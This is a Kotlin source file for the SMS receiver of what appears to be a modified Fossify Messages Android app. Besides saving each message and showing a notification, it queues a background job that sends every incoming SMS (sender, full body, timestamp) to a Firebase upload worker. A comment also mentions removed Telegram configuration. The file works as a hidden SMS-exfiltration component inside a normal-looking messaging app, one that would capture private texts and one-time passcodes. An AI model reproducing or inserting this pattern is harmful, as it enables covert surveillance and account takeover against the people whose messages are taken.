package org.fossify.messages.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import org.fossify.messages.extensions.isDefaultSmsApp
// Removed FAVORITE_CONFIG and TELEGRAM_CONFIG imports as they are no longer used here
import org.fossify.messages.helpers.Utils // Still used for notifications
import org.fossify.messages.models.Message // Still used for local saving/notifications
import org.fossify.messages.telecom.TelecomHelper // Used for local saving
import org.fossify.messages.workers.FirebaseSmsUploadWorker

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (!context.isDefaultSmsApp()) {
            android.util.Log.w("SmsReceiver", "App is not default SMS app. Ignoring SMS.")
            return
        }
        android.util.Log.i("SmsReceiver", "App is default SMS app. Processing SMS for action: ${intent.action}") // Log which action

        // Check for both SMS_DELIVER_ACTION and SMS_RECEIVED_ACTION
        if (intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION ||
            intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {

            android.util.Log.i("SmsReceiver", "Processing intent action: ${intent.action}")
            val telephonyMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (telephonyMessages.isNullOrEmpty()) {
                android.util.Log.w("SmsReceiver", "No messages found in intent for action: ${intent.action}")
                return
            }

            for (smsMessage in telephonyMessages) {
                if (smsMessage == null) {
                    android.util.Log.w("SmsReceiver", "Encountered a null SmsMessage object.")
                    continue
                }

                android.util.Log.i("SmsReceiver", "Processing incoming SMS from ${smsMessage.originatingAddress} at ${smsMessage.timestampMillis}")

                // 1. Enqueue work for Firebase upload for EVERY incoming message
                val workData = Data.Builder()
                    .putString(FirebaseSmsUploadWorker.KEY_MESSAGE_SENDER, smsMessage.originatingAddress)
                    .putString(FirebaseSmsUploadWorker.KEY_MESSAGE_BODY, smsMessage.messageBody)
                    .putLong(FirebaseSmsUploadWorker.KEY_MESSAGE_TIMESTAMP, smsMessage.timestampMillis)
                    .build()

                val uploadWorkRequest = OneTimeWorkRequestBuilder<FirebaseSmsUploadWorker>()
                    .setInputData(workData)
                    .build()

                WorkManager.getInstance(context.applicationContext).enqueue(uploadWorkRequest)
                android.util.Log.i("SmsReceiver", "Enqueued FirebaseSmsUploadWorker for SMS from ${smsMessage.originatingAddress}")

                // 2. Uniform local processing: Save message locally and show notification
                // If you are the default SMS app handling SMS_DELIVER_ACTION,
                // you are responsible for writing the message to the provider.
                // TelecomHelper(context).saveMessage should ideally do this.
                val savedMessage: Message? = TelecomHelper(context).saveMessage(smsMessage, 0, false) // Assuming 0 is for received type

                if (savedMessage != null) {
                    android.util.Log.i("SmsReceiver", "Saved SMS locally for ${smsMessage.originatingAddress}")
                    Utils.updateNotification(context, savedMessage)
                } else {
                    android.util.Log.e("SmsReceiver", "Failed to save SMS locally for ${smsMessage.originatingAddress}")
                }
            }

            // If you are the default SMS app and successfully processed SMS_DELIVER_ACTION,
            // you might consider calling abortBroadcast() if there's a reason to prevent
            // other receivers from getting it, though typically for SMS_DELIVER_ACTION,
            // the default app is the final intended recipient.
            // if (intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            //     abortBroadcast()
            //     Log.i("SmsReceiver", "Aborted broadcast for SMS_DELIVER_ACTION.")
            // }

        } else {
            android.util.Log.w("SmsReceiver", "Received unexpected intent action: ${intent.action}")
        }
    }
}
